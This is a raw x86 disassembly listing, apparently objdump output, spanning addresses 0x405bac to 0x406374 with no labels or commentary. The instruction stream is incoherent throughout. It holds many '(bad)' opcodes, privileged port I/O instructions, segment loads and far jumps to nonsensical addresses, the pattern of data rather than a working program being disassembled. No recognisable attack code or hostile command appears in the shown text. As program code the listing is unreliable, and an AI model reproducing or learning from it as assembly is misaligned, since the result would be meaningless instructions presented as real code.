  405bac:	ficom  DWORD PTR [edx-0x32]
  405baf:	cmp    dh,BYTE PTR [edx-0x6db243a8]
  405bb5:	jmp    0xcbef65ce
  405bba:	dec    esi
  405bbb:	dec    ebx
  405bbc:	in     al,0x7a
  405bbe:	rol    DWORD PTR [ebx+ebp*4],cl
  405bc1:	adc    ebx,DWORD PTR [ecx-0x62]
  405bc4:	pushf  
  405bc5:	cmp    eax,0x13c34b06
  405bca:	ins    DWORD PTR es:[edi],dx
  405bcb:	mov    ss,WORD PTR [esi+0x7d]
  405bce:	mul    DWORD PTR [edi-0x2110eb0b]
  405bd4:	xor    al,BYTE PTR [esi+esi*2+0x5]
  405bd8:	in     al,dx
  405bd9:	into   
  405bda:	dec    edx
  405bdb:	xchg   esp,eax
  405bdc:	fxch   st(4)
  405bde:	ret    
  405bdf:	inc    eax
  405be0:	outs   dx,BYTE PTR ds:[esi]
  405be1:	cmp    dh,BYTE PTR [ebp+0xe]
  405be4:	cmp    ebx,DWORD PTR [esi-0x2b]
  405be7:	aas    
  405be8:	mov    edx,DWORD PTR [edi]
  405bea:	cld    
  405beb:	push   esi
  405bec:	mov    ebp,0x3cf6f950
  405bf1:	lahf   
  405bf2:	push   ds
  405bf3:	retf   
  405bf4:	imul   esi,DWORD PTR [ebx-0x329fde6],0x5f85eb58
  405bfe:	daa    
  405bff:	jmp    0x405bba
  405c01:	ja     0x405b99
  405c03:	inc    edx
  405c04:	fsub   DWORD PTR [ebx]
  405c06:	cmc    
  405c07:	xchg   edx,eax
  405c08:	cld    
  405c09:	and    BYTE PTR [eax+eax*2],ch
  405c0c:	(bad)  
  405c0d:	leave  
  405c0e:	xor    eax,0x47c716c3
  405c13:	jecxz  0x405c22
  405c15:	inc    esp
  405c16:	in     eax,dx
  405c17:	push   edx
  405c18:	push   esi
  405c19:	sub    bh,dl
  405c1b:	push   edi
  405c1c:	jge    0x405c9a
  405c1e:	inc    edx
  405c1f:	test   al,0xb9
  405c21:	xchg   ecx,eax
  405c22:	pop    ebp
  405c23:	popf   
  405c24:	jmp    0xa5046697
  405c29:	jmp    0xa67171c
  405c2e:	retf   
  405c2f:	sub    esp,edi
  405c31:	cwde   
  405c32:	stos   DWORD PTR es:[edi],eax
  405c33:	mov    ch,0x69
  405c35:	int3   
  405c36:	imul   ebp,DWORD PTR [ebp+0x46],0xffffff9e
  405c3a:	test   esi,ebx
  405c3c:	jae    0x405c22
  405c3e:	nop
  405c3f:	jl     0x405bfc
  405c41:	or     al,0xa
  405c43:	mov    edx,0x37dd0304
  405c48:	ds out 0x47,al
  405c4b:	jecxz  0x405c3d
  405c4d:	sbb    esp,DWORD PTR [esi+eax*2-0x10]
  405c51:	push   ebp
  405c52:	xor    esi,DWORD PTR [ecx+0x772b28b7]
  405c58:	add    DWORD PTR [ebx+0xd2b65f9],ebx
  405c5e:	mov    ds:0x12951fce,eax
  405c63:	mov    bh,0xb0
  405c65:	adc    al,0xb8
  405c67:	fsubr  QWORD PTR [edi]
  405c69:	repnz cwde 
  405c6b:	mov    al,0x7e
  405c6d:	push   esi
  405c6e:	mov    edx,0x73b5b44a
  405c73:	clc    
  405c74:	push   ss
  405c75:	(bad)  
  405c76:	ficomp DWORD PTR [ecx]
  405c78:	add    ecx,DWORD PTR gs:[ebp+0xa0627cf]
  405c7f:	or     dl,ch
  405c81:	lds    edx,FWORD PTR [esi+eax*1]
  405c84:	adc    BYTE PTR [edi-0x2f],0x1c
  405c88:	retf   0x28b8
  405c8b:	sbb    bh,ch
  405c8d:	mov    ecx,0xf37768db
  405c92:	fist   DWORD PTR [ebp-0x38c1c6a5]
  405c98:	pop    edx
  405c99:	or     bl,ah
  405c9b:	xchg   edx,eax
  405c9c:	jno    0x405cca
  405c9e:	icebp  
  405c9f:	push   DWORD PTR [edx-0x3c]
  405ca2:	mov    WORD PTR [eax+0x67],?
  405ca5:	(bad)  
  405ca6:	enter  0xc518,0xc9
  405caa:	neg    ebp
  405cac:	xchg   ebx,eax
  405cad:	out    dx,eax
  405cae:	dec    ebx
  405caf:	(bad)
  405cb3:	xchg   esi,eax
  405cb4:	xchg   edi,eax
  405cb5:	sub    DWORD PTR [edi],esp
  405cb7:	ror    BYTE PTR [edi+0x11],1
  405cba:	cmp    cl,bh
  405cbc:	or     BYTE PTR [edi+0x2e54b99],cl
  405cc2:	push   esi
  405cc3:	push   esp
  405cc4:	sub    eax,DWORD PTR [ecx+ebp*2-0x1287fea5]
  405ccb:	or     al,0xe
  405cce:	(bad)  [eax-0x57]
  405cd1:	and    BYTE PTR [ebp-0x18],ch
  405cd4:	rcl    BYTE PTR [edi-0x6d48c84f],cl
  405cda:	out    0x24,al
  405cdc:	cld    
  405cdd:	or     al,0xe8
  405cdf:	mov    ecx,DWORD PTR [edi-0x5]
  405ce2:	(bad)  
  405ce3:	mov    eax,edi
  405ce5:	cmp    eax,0x614098d6
  405cea:	or     BYTE PTR [ecx-0x5f71420c],bl
  405cf0:	lods   al,BYTE PTR ds:[esi]
  405cf1:	xor    DWORD PTR [edx-0x5427e848],eax
  405cf7:	xor    BYTE PTR [esi-0x64],cl
  405cfa:	iret   
  405cfb:	das    
  405cfc:	sub    BYTE PTR ds:0xbad09502,bl
  405d02:	loope  0x405d3c
  405d04:	cld    
  405d05:	xchg   ecx,eax
  405d06:	arpl   WORD PTR [eax+0x19],bp
  405d09:	inc    esp
  405d0a:	fucomip st,st(4)
  405d0c:	inc    esi
  405d0d:	mov    edi,DWORD PTR [ebx]
  405d0f:	sahf   
  405d10:	cmp    esi,esi
  405d12:	dec    ebp
  405d13:	js     0x405d44
  405d15:	in     eax,0x30
  405d17:	ds or  eax,0x89730b11
  405d1d:	jno    0x405cd5
  405d1f:	adc    ebx,DWORD PTR [ecx]
  405d21:	inc    ecx
  405d22:	inc    ebp
  405d23:	adc    eax,0xc9c99b40
  405d28:	out    dx,al
  405d29:	sbb    al,0x35
  405d2b:	add    DWORD PTR [eax],ecx
  405d2d:	ret    0x1668
  405d30:	jno    0x405d21
  405d32:	adc    BYTE PTR [edi-0x70],al
  405d35:	iret   
  405d36:	xchg   esp,eax
  405d37:	lock adc edx,0x9e1c16c8
  405d3e:	adc    DWORD PTR [ebx-0xc061e66],ecx
  405d44:	push   edi
  405d45:	dec    edi
  405d46:	cwde   
  405d47:	mov    ebx,0x249f1df7
  405d4c:	mov    ds:0x57e6575c,eax
  405d51:	fbld   TBYTE PTR [ebx+ecx*2]
  405d54:	mov    BYTE PTR [ebx-0x20],bl
  405d57:	leave  
  405d58:	cmp    DWORD PTR [eax+0x11f8484f],ecx
  405d5e:	scas   al,BYTE PTR es:[edi]
  405d5f:	mov    ebx,0xe70febf2
  405d64:	data16 test bl,0x66
  405d68:	mov    edx,0x38faa38f
  405d6d:	ret    
  405d6e:	cmp    DWORD PTR [eax+0x699690fa],ebx
  405d74:	sbb    esp,ecx
  405d76:	(bad)  
  405d77:	fidiv  DWORD PTR [edx+0x6f977cc5]
  405d7d:	dec    edx
  405d7e:	mov    edx,0x90f6e718
  405d83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405d84:	xchg   DWORD PTR [ebx+edx*4+0x75c773a2],ecx
  405d8b:	jmp    0x405dcf
  405d8d:	lahf   
  405d8e:	inc    ecx
  405d8f:	push   cs
  405d90:	repz push ebp
  405d92:	dec    ebp
  405d93:	in     al,0x95
  405d95:	mov    ecx,0x94b0f9be
  405d9a:	mov    bl,dh
  405d9c:	arpl   WORD PTR [edx+0x22856b0a],ax
  405da2:	mov    ecx,0xe3ee4a5f
  405da7:	sbb    al,0xf6
  405da9:	not    DWORD PTR [edx-0x29dc157a]
  405daf:	push   0x4ca3bef0
  405db4:	mov    esi,0xaef8e41
  405db9:	xor    eax,0x220621ae
  405dbe:	bound  eax,QWORD PTR [esi+0x54]
  405dc1:	out    dx,al
  405dc2:	cmp    al,0x2e
  405dc4:	fdiv   QWORD PTR [edx-0x70]
  405dc7:	loope  0x405d69
  405dc9:	add    dh,BYTE PTR [eax+0x67]
  405dcc:	jmp    0x3985:0xf70b3009
  405dd3:	or     ebp,DWORD PTR [edi+ebp*4+0x69]
  405dd7:	dec    esi
  405dd8:	scas   eax,DWORD PTR es:[edi]
  405dd9:	inc    eax
  405dda:	add    esi,0x39d3d83c
  405de0:	aas    
  405de1:	arpl   WORD PTR [edx+0x325a7d52],di
  405de7:	add    BYTE PTR [ebx+0x71],dl
  405dea:	pop    ebp
  405deb:	fwait
  405dec:	sahf   
  405ded:	call   0xf78:0x723e5618
  405df4:	push   0x8519deef
  405df9:	mov    ds:0x1f5670e4,eax
  405dfe:	lock test al,0x16
  405e01:	sahf   
  405e02:	cmp    ch,BYTE PTR [ecx-0x6]
  405e05:	ror    BYTE PTR [ecx-0x6f9fbfe1],cl
  405e0b:	adc    dh,BYTE PTR [ebp+0x3c]
  405e0e:	mov    esi,0x9ad77b0f
  405e13:	int3   
  405e14:	daa    
  405e15:	adc    al,0x13
  405e17:	jno    0x405dbe
  405e19:	mov    eax,0xa5cb3f4f
  405e1e:	icebp  
  405e1f:	outs   dx,DWORD PTR ds:[esi]
  405e20:	push   cs
  405e21:	xchg   ebx,eax
  405e22:	add    DWORD PTR [eax+0x66870fe],edi
  405e28:	pop    ebx
  405e29:	scas   eax,DWORD PTR es:[edi]
  405e2a:	(bad)  
  405e2b:	aam    0x7f
  405e2d:	jo     0x405dd8
  405e2f:	ss xor al,0xce
  405e32:	out    0xbd,al
  405e34:	and    BYTE PTR [edx+0x74ca4036],ah
  405e3a:	ins    BYTE PTR es:[edi],dx
  405e3b:	arpl   bp,bx
  405e3d:	mov    bl,0x10
  405e3f:	in     eax,dx
  405e40:	scas   eax,DWORD PTR es:[edi]
  405e41:	(bad)  
  405e42:	fs jecxz 0x405e39
  405e45:	push   ecx
  405e46:	and    eax,0xe12c4e7d
  405e4b:	out    0x64,eax
  405e4d:	in     al,dx
  405e4e:	ror    DWORD PTR ds:0xa814af03,1
  405e54:	jo     0x405e3f
  405e56:	inc    eax
  405e57:	sbb    BYTE PTR [edx],dh
  405e59:	(bad)  
  405e5b:	fnsetpm(287 only) 
  405e5d:	shl    ah,1
  405e5f:	test   al,0x3d
  405e61:	in     al,0xf5
  405e63:	sub    al,0x21
  405e65:	les    esp,FWORD PTR [eax-0x42]
  405e68:	mov    bl,0xb6
  405e6a:	scas   al,BYTE PTR es:[edi]
  405e6b:	jns    0x405e8d
  405e6d:	and    al,0xc6
  405e6f:	jno    0x405eeb
  405e71:	ds ret 
  405e73:	repz pop esi
  405e75:	cld    
  405e76:	mov    ah,0x8c
  405e78:	test   eax,0x12f07bf0
  405e7d:	fimul  DWORD PTR [edx+0x51]
  405e80:	push   edx
  405e81:	sub    DWORD PTR ds:0xf177caa0,esp
  405e87:	push   0x4c
  405e89:	cmp    DWORD PTR ds:0x4fff15a0,ecx
  405e8f:	dec    edx
  405e90:	pop    ss
  405e91:	pop    ecx
  405e92:	repnz popa 
  405e94:	sbb    cl,BYTE PTR [esi-0x77]
  405e97:	nop
  405e98:	sbb    BYTE PTR [ebp+0x75],0xf0
  405e9c:	pop    ds
  405e9d:	out    0xff,al
  405e9f:	mov    al,ds:0x6cd657f4
  405ea4:	and    al,0xcc
  405ea6:	into   
  405ea7:	jmp    0x405ee7
  405ea9:	mov    edi,esp
  405eab:	inc    edi
  405eac:	xchg   ebx,eax
  405ead:	sbb    bh,BYTE PTR [ecx]
  405eaf:	ret    0x7ccd
  405eb2:	cmp    ch,BYTE PTR [ebp-0x4f]
  405eb5:	aad    0x95
  405eb7:	pop    ebp
  405eb8:	xchg   edx,eax
  405eb9:	lahf   
  405eba:	jmp    0xf20c:0x4cef36fc
  405ec1:	out    0x37,eax
  405ec3:	mov    DWORD PTR [esi-0xd59c385],edi
  405ec9:	hlt    
  405eca:	js     0x405ecf
  405ecc:	in     eax,0xa2
  405ece:	pop    edx
  405ecf:	jae    0x405eff
  405ed1:	push   ss
  405ed2:	ret    
  405ed3:	sbb    eax,0x5458024f
  405ed8:	aad    0xc6
  405eda:	mov    cl,0x3e
  405edc:	jno    0x405ed2
  405ede:	faddp  st(0),st
  405ee0:	(bad)  
  405ee2:	in     al,dx
  405ee3:	jecxz  0x405e6a
  405ee5:	adc    DWORD PTR [ebx],ebp
  405ee7:	push   cs
  405ee8:	popa   
  405ee9:	add    DWORD PTR [esi+0x66777cb0],edx
  405eef:	inc    ebx
  405ef0:	ror    DWORD PTR [di],0x80
  405ef4:	jmp    0x405ef0
  405ef6:	out    0x38,eax
  405ef8:	rcl    esi,cl
  405efa:	gs sub al,0x2f
  405efd:	jb     0x405f46
  405eff:	mov    dl,0xcb
  405f01:	sti    
  405f02:	mov    ds:0xfc1ab92c,al
  405f07:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f08:	test   BYTE PTR [esi-0x388961c3],ch
  405f0e:	(bad)  
  405f0f:	adc    bh,BYTE PTR [edx]
  405f11:	aaa    
  405f12:	int    0x94
  405f14:	sbb    ecx,esi
  405f16:	mov    eax,0x8c87d56c
  405f1b:	data16 ror al,cl
  405f1e:	out    dx,eax
  405f1f:	push   eax
  405f20:	or     BYTE PTR [ecx],ch
  405f22:	xor    al,bl
  405f24:	stc    
  405f25:	icebp  
  405f26:	xchg   esp,eax
  405f27:	out    0x26,eax
  405f29:	xchg   esi,eax
  405f2a:	xchg   edi,eax
  405f2b:	dec    ebp
  405f2c:	dec    eax
  405f2d:	mov    edi,0xf8708db8
  405f32:	lods   al,BYTE PTR ds:[si]
  405f34:	test   BYTE PTR [eax+0x3c],dh
  405f37:	ror    bh,cl
  405f39:	push   edi
  405f3a:	push   ss
  405f3b:	leave  
  405f3c:	inc    eax
  405f3d:	imul   esp,edx,0xf42ed38b
  405f43:	cmp    al,0xfc
  405f45:	xor    BYTE PTR [edi+0x67],0x1c
  405f49:	dec    ebx
  405f4a:	pusha  
  405f4b:	jle    0x405f47
  405f4d:	pop    ebp
  405f4e:	push   esi
  405f4f:	xchg   edx,eax
  405f50:	loope  0x405f6f
  405f52:	sahf   
  405f53:	gs inc eax
  405f55:	out    dx,eax
  405f56:	data16 jne 0x405f44
  405f59:	mov    ch,0x9f
  405f5b:	fcomp  DWORD PTR [esi-0x1f]
  405f5e:	xchg   esi,eax
  405f5f:	push   eax
  405f60:	fcomp  QWORD PTR [ecx-0x4405bc39]
  405f66:	loop   0x405f22
  405f68:	ret    
  405f69:	inc    ebx
  405f6a:	mov    ecx,DWORD PTR [edi]
  405f6c:	addr16 pop es
  405f6e:	test   DWORD PTR [ebx+edi*2],ebp
  405f71:	jbe    0x405f87
  405f73:	rcl    BYTE PTR [esi+0x37b462ec],1
  405f79:	fild   WORD PTR cs:[ebp+0x265854b0]
  405f80:	mov    esp,DWORD PTR [ecx]
  405f82:	int3   
  405f83:	push   edi
  405f84:	mov    ebx,0xe6f5a0c7
  405f89:	pextrw esp,mm0,0x37
  405f8d:	add    ecx,DWORD PTR [eax+0x23]
  405f90:	hlt    
  405f91:	jecxz  0x405f2e
  405f93:	leave  
  405f94:	in     eax,dx
  405f95:	xchg   ebp,eax
  405f96:	mov    fs,WORD PTR [ecx]
  405f98:	cmovno edi,ebp
  405f9b:	daa    
  405f9c:	test   DWORD PTR [ecx],ebp
  405f9e:	gs pop esi
  405fa0:	pop    esp
  405fa1:	push   es
  405fa2:	stc    
  405fa3:	dec    esp
  405fa4:	mov    DWORD PTR [edx-0x54e23f8c],ebp
  405faa:	leave  
  405fab:	in     al,0xb3
  405fad:	neg    bl
  405faf:	leave  
  405fb0:	cli    
  405fb1:	mov    edi,0x9201674
  405fb6:	repnz leave 
  405fb8:	inc    esi
  405fb9:	mov    dh,0x13
  405fbb:	cwde   
  405fbc:	mov    eax,ds:0xbee66fb7
  405fc1:	retf   0x7585
  405fc4:	mov    DWORD PTR [ebx+0x14],ebp
  405fc7:	mov    cl,0xf3
  405fc9:	mov    BYTE PTR [esi+0x652fe68f],bh
  405fcf:	dec    ecx
  405fd0:	dec    eax
  405fd1:	(bad)  [edx+0x33d68324]
  405fd7:	loopne 0x405f9c
  405fd9:	pop    edx
  405fda:	dec    ebp
  405fdb:	fsubr  st,st(0)
  405fdd:	or     al,0x23
  405fdf:	in     al,0x78
  405fe1:	cmp    DWORD PTR [esi+0x39292837],esp
  405fe7:	mov    ds:0x9ba87e73,eax
  405fec:	fldenv [esi]
  405fee:	xor    ecx,ebp
  405ff0:	test   eax,0xf60ec935
  405ff5:	push   ebp
  405ff6:	cmp    al,0x74
  405ff8:	into   
  405ff9:	dec    ebp
  405ffa:	into   
  405ffb:	and    DWORD PTR [edx],ecx
  405ffd:	(bad)  
  405fff:	inc    ecx
  406000:	xor    ah,bh
  406002:	fsubrp st(6),st
  406004:	mov    eax,0xd07d1ad0
  406009:	leave  
  40600a:	shr    BYTE PTR [edi-0x36],1
  40600d:	addr16 arpl ax,si
  406010:	gs cmc 
  406012:	stos   BYTE PTR es:[edi],al
  406013:	test   BYTE PTR [ebx-0x46],bh
  406016:	pusha  
  406017:	iret   
  406018:	cmp    BYTE PTR [edi+0x1915c60f],0x54
  40601f:	xchg   sp,ax
  406021:	and    ecx,DWORD PTR [edx+0x2b]
  406024:	sbb    eax,0x60881905
  406029:	call   0xe69462da
  40602e:	xchg   ebx,eax
  40602f:	xor    al,BYTE PTR ds:0xf3e98f19
  406035:	and    al,0x84
  406037:	mov    eax,0x980c68d7
  40603c:	ds mov ah,0xde
  40603f:	push   cs
  406040:	mov    bl,0x6
  406042:	dec    eax
  406043:	xchg   ecx,eax
  406044:	ror    BYTE PTR [eax],cl
  406046:	add    eax,DWORD PTR [edx-0x3a441630]
  40604c:	or     DWORD PTR [ebx],esi
  40604e:	mov    ebx,0xe63faffa
  406053:	sar    BYTE PTR [ecx+0x59b69806],cl
  406059:	xor    DWORD PTR [esi+0x7a],edx
  40605c:	jae    0x406038
  40605e:	dec    edi
  40605f:	inc    edi
  406060:	adc    al,0x39
  406062:	add    cl,BYTE PTR es:[ecx]
  406065:	rol    BYTE PTR [eax+0x7da6ed46],1
  40606b:	dec    eax
  40606c:	pop    es
  40606d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40606e:	frstor [ebp-0x476f056d]
  406074:	jnp    0x4060b9
  406076:	or     dh,BYTE PTR [ecx-0x3babd87c]
  40607c:	add    al,0xdc
  40607e:	mov    DWORD PTR [edi+0x1ce4c367],ebx
  406084:	dec    ebp
  406085:	addr16 ret 
  406087:	out    0x0,al
  406089:	ret    0x5c93
  40608c:	in     eax,0x0
  40608e:	js     0x4060df
  406090:	bound  ecx,QWORD PTR [esi-0x33]
  406093:	add    ebx,esp
  406095:	dec    edi
  406096:	(bad)  
  406097:	mov    ebp,0xdfc27abb
  40609c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40609d:	jae    0x406055
  40609f:	out    dx,al
  4060a0:	mov    ch,0x90
  4060a2:	jb     0x40606e
  4060a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060a5:	pop    es
  4060a6:	xchg   ecx,eax
  4060a7:	rcl    DWORD PTR [ebx-0x28994a33],0xa6
  4060ae:	lods   eax,DWORD PTR ds:[esi]
  4060af:	stos   BYTE PTR es:[edi],al
  4060b0:	js     0x4060c9
  4060b2:	pop    eax
  4060b3:	je     0x4060d7
  4060b5:	data16 mov dh,0xbd
  4060b8:	repz mov ebp,0x4688f36e
  4060be:	(bad)  
  4060bf:	(bad)  
  4060c0:	ins    BYTE PTR es:[edi],dx
  4060c1:	xor    DWORD PTR [edi+0x562a5b07],ebx
  4060c7:	clc    
  4060c8:	mov    ch,0xb2
  4060ca:	or     al,dh
  4060cc:	pop    ebp
  4060cd:	and    BYTE PTR [eax-0x4b],0x81
  4060d1:	push   cs
  4060d2:	or     BYTE PTR [esp+eax*1-0x36],bh
  4060d6:	repnz fcomp DWORD PTR [esp+esi*8-0x543f4ca2]
  4060de:	pop    ecx
  4060df:	inc    edi
  4060e0:	dec    edx
  4060e1:	xor    DWORD PTR [eax-0x2c],edx
  4060e4:	outs   dx,DWORD PTR ds:[esi]
  4060e5:	mov    eax,ds:0xacd7be21
  4060ea:	xchg   ebx,eax
  4060eb:	adc    eax,ebp
  4060ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4060ee:	loopne 0x406130
  4060f0:	add    bh,BYTE PTR [ebp-0x49324af0]
  4060f6:	add    al,0xca
  4060f8:	ins    BYTE PTR es:[edi],dx
  4060f9:	mov    ch,0x17
  4060fb:	shl    BYTE PTR [edi-0x2a0ce7c6],0x41
  406102:	int3   
  406103:	inc    edx
  406104:	or     eax,0xde848a37
  406109:	outs   dx,DWORD PTR ds:[esi]
  40610a:	lods   al,BYTE PTR ds:[esi]
  40610b:	jns    0x4060d4
  40610d:	and    edi,eax
  40610f:	cwde   
  406110:	popa   
  406111:	out    dx,al
  406112:	fnstenv [edx+0x211b7384]
  406118:	faddp  st(4),st
  40611a:	jle    0x406124
  40611c:	call   0x73c95341
  406121:	adc    BYTE PTR [esi],bh
  406123:	xor    ah,BYTE PTR [ecx-0x718c2515]
  406129:	push   edi
  40612a:	call   0x6e75:0x8261094b
  406131:	outs   dx,BYTE PTR ds:[esi]
  406132:	jne    0x4060fd
  406134:	push   eax
  406135:	and    DWORD PTR [eax],esi
  406137:	push   ebp
  406138:	inc    esp
  406139:	dec    ebx
  40613a:	sar    DWORD PTR [eax],0x9f
  40613d:	pop    ebx
  40613e:	lods   eax,DWORD PTR ds:[esi]
  40613f:	jo     0x4060f7
  406141:	mov    al,0x56
  406143:	sti    
  406144:	nop
  406145:	das    
  406146:	and    DWORD PTR [eax-0x3fd83071],eax
  40614c:	add    esi,edi
  40614e:	cwde   
  40614f:	cmc    
  406150:	in     eax,0x1c
  406152:	popf   
  406153:	sub    al,0x1d
  406155:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406156:	ficom  DWORD PTR [edi*4+0x2500f91a]
  40615d:	repz adc cl,BYTE PTR [edi]
  406160:	dec    edx
  406161:	mov    BYTE PTR [edi-0x135e1bcb],dh
  406167:	xchg   BYTE PTR [esi-0x1423c2ad],cl
  40616d:	dec    ecx
  40616e:	ss mov dl,0x2
  406171:	ret    
  406172:	mov    esp,0xf6efb5bf
  406177:	ds dec edx
  406179:	sub    edi,DWORD PTR [edx+0x1b]
  40617c:	inc    esp
  40617d:	pushf  
  40617e:	pushf  
  40617f:	(bad)  
  406180:	retf   
  406181:	sbb    DWORD PTR [esi+0x3f],ecx
  406184:	les    esp,FWORD PTR [esi]
  406186:	in     al,dx
  406187:	xchg   ebx,eax
  406188:	inc    edx
  406189:	lahf   
  40618a:	into   
  40618b:	ret    0x6599
  40618e:	adc    DWORD PTR [ecx+edi*1+0x74769a67],esi
  406195:	push   edx
  406196:	jno    0x406172
  406198:	jl     0x4061a7
  40619a:	js     0x406198
  40619c:	xchg   esi,eax
  40619d:	pushw  ds
  40619f:	test   BYTE PTR [ecx+0xd],ah
  4061a2:	shr    BYTE PTR [ebx+eiz*4-0x4b1a5c04],1
  4061a9:	push   cs
  4061aa:	in     al,0xd0
  4061ac:	sub    BYTE PTR gs:[ebx-0x2c],cl
  4061b0:	push   ebp
  4061b1:	push   eax
  4061b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061b3:	ja     0x406215
  4061b5:	sub    eax,0xf038415e
  4061ba:	jmp    0xe8e8:0x9222fc1c
  4061c1:	jge    0x4061cf
  4061c3:	xor    BYTE PTR [edi+0x557318e6],dh
  4061c9:	inc    ebp
  4061ca:	push   eax
  4061cb:	jge    0x406230
  4061cd:	ret    0xb73f
  4061d0:	js     0x4061e2
  4061d2:	idiv   BYTE PTR [ebx-0x4f0ee6ba]
  4061d8:	lock and DWORD PTR [eax-0x45],0xd4f32d15
  4061e0:	jecxz  0x406225
  4061e2:	mov    ebp,0x6647dd0
  4061e7:	inc    esp
  4061e8:	pop    es
  4061e9:	icebp  
  4061ea:	out    0x21,eax
  4061ec:	fdiv   st(7),st
  4061ee:	mov    DWORD PTR [edx-0x6441bf8e],0x9b34fe51
  4061f8:	xchg   ebx,eax
  4061f9:	sbb    bh,BYTE PTR [ebx-0x20]
  4061fc:	nop
  4061fd:	adc    BYTE PTR [eax+0x4c],ch
  406200:	mov    dl,0xed
  406202:	(bad)  
  406203:	cli    
  406204:	in     al,0xe6
  406206:	sub    eax,esp
  406208:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406209:	mov    ebx,0x18c3397c
  40620e:	sbb    al,0x5a
  406210:	mov    eax,ds:0x34745448
  406215:	sub    esi,DWORD PTR [edx-0x6c]
  406218:	das    
  406219:	sub    ebp,ebp
  40621b:	jg     0x406204
  40621d:	and    bl,BYTE PTR [ebx-0x67]
  406220:	pop    ds
  406221:	inc    ebp
  406222:	jnp    0x406202
  406224:	out    0xbf,al
  406226:	push   ss
  406227:	pop    ecx
  406228:	or     ecx,DWORD PTR [ebx+0x2d]
  40622b:	pop    esi
  40622c:	mov    WORD PTR [ebx-0x2fc76e7e],cs
  406232:	inc    ebx
  406233:	and    eax,0x81fce4de
  406238:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406239:	shl    DWORD PTR [ecx-0x53],0xf5
  40623d:	fs fcmovne st,st(3)
  406240:	mov    ds:0x6995fad0,al
  406245:	aas    
  406246:	cwde   
  406247:	int3   
  406248:	mov    cl,0xc9
  40624a:	sub    DWORD PTR [ebx],ebx
  40624c:	repnz push ebp
  40624e:	mov    edi,0x713d253e
  406253:	dec    eax
  406254:	xchg   edx,eax
  406255:	jb     0x40626f
  406257:	push   DWORD PTR [eax-0x38]
  40625a:	dec    ecx
  40625b:	add    al,0xcd
  40625d:	in     eax,dx
  40625e:	sub    BYTE PTR [edx+edx*1+0x18],ah
  406262:	pop    ss
  406263:	mov    esp,0x3e0f6b5f
  406268:	sub    bl,cl
  40626a:	jmp    FWORD PTR [esi+0x73cc8e26]
  406270:	pop    es
  406271:	xchg   DWORD PTR [edx-0x2],ecx
  406274:	mov    ch,0x82
  406276:	shl    ch,1
  406278:	jl     0x40628f
  40627a:	push   0xffffff90
  40627c:	out    dx,eax
  40627d:	push   ebx
  40627e:	mov    ds:0x47842209,al
  406283:	add    ebp,eax
  406285:	inc    ebx
  406286:	mov    ch,0xa6
  406288:	mov    esp,0x77b40a14
  40628d:	sbb    DWORD PTR [eax+0x2bc27b3d],0xc46ce658
  406297:	stos   DWORD PTR es:[edi],eax
  406298:	outs   dx,DWORD PTR ds:[esi]
  406299:	mov    al,ds:0x18a25f4b
  40629e:	into   
  40629f:	es inc ecx
  4062a1:	aas    
  4062a2:	(bad)  
  4062a3:	dec    ebp
  4062a4:	cs inc ebp
  4062a6:	sub    eax,0x24118fd2
  4062ab:	stc    
  4062ac:	mov    cl,0x61
  4062ae:	dec    ecx
  4062af:	push   es
  4062b0:	add    eax,0xba6f360a
  4062b5:	cmp    DWORD PTR [ebx+0x19],ebp
  4062b8:	iret   
  4062b9:	cmp    eax,0x9e14ace6
  4062be:	inc    ecx
  4062bf:	pop    edx
  4062c0:	ret    0x45a
  4062c3:	loopne 0x40630c
  4062c5:	test   eax,0xdf57c3a6
  4062ca:	ss in  eax,0x55
  4062cd:	sbb    BYTE PTR [edi+0x33],ah
  4062d0:	mov    ebp,0xc74be574
  4062d5:	jne    0x406297
  4062d7:	mov    ds:0x32cb7337,eax
  4062dc:	stos   BYTE PTR es:[edi],al
  4062dd:	adc    eax,DWORD PTR [eax-0x3b]
  4062e0:	xor    esi,edi
  4062e2:	jb     0x40632e
  4062e4:	xchg   bl,al
  4062e6:	adc    ebp,esp
  4062e8:	pop    ecx
  4062e9:	test   ch,ch
  4062eb:	ror    DWORD PTR [edx],cl
  4062ed:	inc    eax
  4062ee:	push   ebp
  4062ef:	mov    ecx,0xe1c45145
  4062f4:	pop    edx
  4062f5:	in     eax,dx
  4062f6:	or     eax,0xc84c8c30
  4062fb:	adc    al,0xae
  4062fd:	sbb    al,0x18
  4062ff:	retf   0x5dc2
  406302:	lea    edx,[ebx-0x45]
  406305:	mov    ebp,0x61ddf03b
  40630a:	xor    esp,DWORD PTR [esp+edi*2]
  40630d:	imul   edx,DWORD PTR [edi+0x3c],0xfffffff7
  406311:	in     al,0x1f
  406313:	pop    ebx
  406314:	and    al,0x48
  406316:	push   es
  406317:	jnp    0x4062a2
  406319:	outs   dx,BYTE PTR ds:[esi]
  40631a:	adc    DWORD PTR ds:0x4ee2a323,0xffffffb6
  406321:	jg     0x406399
  406323:	jne    0x40634a
  406325:	or     ch,BYTE PTR [ebx+0x575eed2a]
  40632b:	test   al,0x74
  40632d:	inc    ebx
  40632e:	pop    edi
  40632f:	dec    ebx
  406330:	xlat   BYTE PTR ds:[ebx]
  406331:	sub    esp,DWORD PTR ds:0x7313e34d
  406337:	in     al,0xb5
  406339:	xchg   DWORD PTR ds:0xa362e38,ecx
  40633f:	jg     0x4063a5
  406341:	pop    ebp
  406342:	(bad)  
  406343:	adc    DWORD PTR [esi-0x687b829b],esi
  406349:	sbb    BYTE PTR [edx+eiz*8+0x1c0292c3],ah
  406350:	sbb    ecx,esi
  406352:	fisttp DWORD PTR [ecx+0x8]
  406355:	sub    eax,DWORD PTR [eax+0x5d]
  406358:	and    eax,0x31769042
  40635d:	sub    al,0x33
  40635f:	ret    0x4f44
  406362:	dec    ebp
  406363:	xchg   esi,eax
  406364:	(bad)  
  406365:	mov    ebx,DWORD PTR [esi+0x6cdc40a4]
  40636b:	xor    al,0x2e
  40636d:	mov    ebp,0x2f93f24b
  406372:	jnp    0x4063e7
  406374:	bound  ebx,QWORD PTR [edx+0x76]
